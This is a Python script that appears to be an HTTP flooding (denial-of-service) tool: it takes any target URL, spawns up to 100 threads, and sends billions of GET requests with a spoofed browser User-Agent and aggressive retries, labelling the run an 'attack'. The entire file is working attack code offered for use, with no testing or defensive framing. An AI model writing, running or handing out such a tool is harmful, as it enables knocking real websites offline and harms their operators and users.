import requests
import threading
import time
from datetime import datetime
import os
import signal
import sys
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Configuration
REQUESTS_PER_SEND = 5000000000  # 5 billion
MAX_RETRIES = 100               # Max retries per failed request
RETRY_DELAY = 0.1               # Initial retry delay in seconds
MAX_THREADS = 100               # Maximum concurrent threads

# Shared state
success_count = 0
failed_count = 0
running = True
counter_lock = threading.Lock()
start_time = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}‚ēĒ‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēó
‚ēĎ                                                             ‚ēĎ
‚ēĎ          {Colors.MAGENTA}HIGH-PERFORMANCE REQUEST ENGINE{Colors.CYAN}               ‚ēĎ
‚ēĎ                                                             ‚ēĎ
‚ēĎ          {Colors.YELLOW}Each send: {format_number(REQUESTS_PER_SEND)} requests{Colors.CYAN}             ‚ēĎ
‚ēĎ          {Colors.YELLOW}Guaranteed delivery mode{Colors.CYAN}                     ‚ēĎ
‚ēĎ                                                             ‚ēĎ
‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ{Colors.END}
"""
    print(banner)

def format_number(num):
    return f"{num:,}"

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] Stopping gracefully...{Colors.END}")
    running = False

def requests_session():
    """Create a session with retry logic"""
    session = requests.Session()
    
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=RETRY_DELAY,
        status_forcelist=[408, 429, 500, 502, 503, 504]
    )
    
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def send_requests(target_url, requests_to_send, thread_id):
    """Send requests with guaranteed delivery"""
    global success_count, failed_count, running
    
    session = requests_session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    }
    
    sent = 0
    while sent < requests_to_send and running:
        try:
            # Send request with timeout
            response = session.get(target_url, headers=headers, timeout=5)
            
            # Only count as success if we get a 2xx response
            if 200 <= response.status_code < 300:
                with counter_lock:
                    success_count += 1
                sent += 1
            else:
                # Retry will be handled by the session's retry mechanism
                pass
                
        except Exception as e:
            # Retry will be handled by the session's retry mechanism
            pass
        
        # Progress update
        if thread_id == 0 and sent % 1000 == 0:  # Only thread 0 reports progress
            print_progress()

def print_progress():
    """Print current progress"""
    elapsed = time.time() - start_time
    req_per_sec = success_count / elapsed if elapsed > 0 else 0
    
    clear_screen()
    print_banner()
    
    print(f"{Colors.CYAN}{Colors.BOLD}[TARGET]{Colors.END} {target_url}")
    print(f"{Colors.CYAN}{Colors.BOLD}[ELAPSED]{Colors.END} {format_time(elapsed)}")
    print(f"{Colors.GREEN}{Colors.BOLD}[SENT]{Colors.END} {format_number(success_count)}")
    print(f"{Colors.BLUE}{Colors.BOLD}[RATE]{Colors.END} {format_number(int(req_per_sec))} req/sec")
    print(f"{Colors.YELLOW}{Colors.BOLD}[PROGRESS]{Colors.END} {calculate_percentage(success_count, total_requests)}%")

def format_time(seconds):
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"

def calculate_percentage(current, total):
    return min(100, int((current / total) * 100)) if total > 0 else 0

def main():
    global running, start_time, target_url, total_requests
    
    clear_screen()
    print_banner()
    
    # Get target URL
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = input(f"{Colors.CYAN}[?] Enter target URL: {Colors.END}").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Get send multiplier
    try:
        multiplier = int(input(f"{Colors.CYAN}[?] Enter multiplier (1 = {format_number(REQUESTS_PER_SEND)} requests): {Colors.END}") or 1)
        multiplier = max(1, min(multiplier, 100))  # Limit to 1-100
    except ValueError:
        multiplier = 1
    
    total_requests = REQUESTS_PER_SEND * multiplier
    
    # Verify target is reachable
    print(f"\n{Colors.YELLOW}[*] Verifying target...{Colors.END}")
    try:
        test_response = requests.get(target_url, timeout=10)
        print(f"{Colors.GREEN}[‚úď] Target responded with status {test_response.status_code}{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[‚úó] Target verification failed: {str(e)}{Colors.END}")
        if input(f"{Colors.YELLOW}[?] Continue anyway? (y/n): {Colors.END}").lower() != 'y':
            return
    
    # Calculate optimal thread count
    thread_count = min(MAX_THREADS, max(1, total_requests // 10000000))  # 1 thread per 10M requests
    
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[*] Starting attack with:{Colors.END}")
    print(f"  {Colors.CYAN}Target:{Colors.END} {target_url}")
    print(f"  {Colors.CYAN}Total requests:{Colors.END} {format_number(total_requests)}")
    print(f"  {Colors.CYAN}Threads:{Colors.END} {thread_count}")
    print(f"  {Colors.CYAN}Requests per thread:{Colors.END} {format_number(total_requests // thread_count)}")
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start timer
    start_time = time.time()
    
    # Create and start threads
    threads = []
    requests_per_thread = total_requests // thread_count
    
    for i in range(thread_count):
        # Last thread gets any remainder
        reqs = requests_per_thread + (total_requests % thread_count) if i == thread_count - 1 else requests_per_thread
        t = threading.Thread(target=send_requests, args=(target_url, reqs, i))
        threads.append(t)
        t.start()
    
    # Wait for completion
    for t in threads:
        t.join()
    
    running = False
    
    # Final report
    clear_screen()
    print_banner()
    
    elapsed = time.time() - start_time
    req_per_sec = success_count / elapsed if elapsed > 0 else 0
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[‚úď] OPERATION COMPLETE{Colors.END}")
    print(f"{Colors.CYAN}Target:{Colors.END} {target_url}")
    print(f"{Colors.CYAN}Duration:{Colors.END} {format_time(elapsed)}")
    print(f"{Colors.CYAN}Total requests sent:{Colors.END} {format_number(success_count)}")
    print(f"{Colors.CYAN}Average rate:{Colors.END} {format_number(int(req_per_sec))} req/sec")
    
    if success_count >= total_requests:
        print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] All requests delivered!{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}{Colors.BOLD}[WARNING] Only delivered {calculate_percentage(success_count, total_requests)}% of requests{Colors.END}")

if __name__ == "__main__":
    main()